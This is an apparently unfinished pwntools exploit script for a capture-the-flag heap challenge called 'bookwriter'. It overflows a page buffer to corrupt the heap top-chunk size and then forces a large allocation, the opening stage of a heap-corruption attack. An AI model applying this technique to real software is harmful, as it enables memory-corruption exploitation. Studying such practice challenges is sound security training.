from pwn import *

io = process('./bookwriter')#, env={"LD_PRELOAD":"libc_64.so.6"})

def add(size, content):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'1')
    print(io.recvuntil(b'Size of page :'))
    io.sendline(str(size))
    print(io.recvuntil(b'Content :'))
    io.send(content)

def view(index):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'2')
    print(io.recvuntil(b'Index of page :'))
    io.sendline(str(index))

def edit(index, content):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'3')
    print(io.recvuntil(b'Index of page :'))
    io.sendline(str(index))
    print(io.recvuntil(b'Content:'))
    io.send(content)

def change_author(new_name):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'4')
    print(io.recvuntil(b'Do you want to change the author ? (yes:1 / no:0) '))
    io.sendline(b'1')
    print(io.recvuntil(b'Author :'))
    io.send(new_name)


print(io.recvuntil(b'Author :'))
author = b'A'*0x40
io.send(author)
add(20, b'A')
change_author(b'bruh')
add(24, b'A')
edit(1, b'A'*24)
edit(1, b'A'*24+b'\xe1\x0f\0')
add(0x1000, b'CUM')
pause()
print(io.recv())
#add(20, 'A')
#edit()
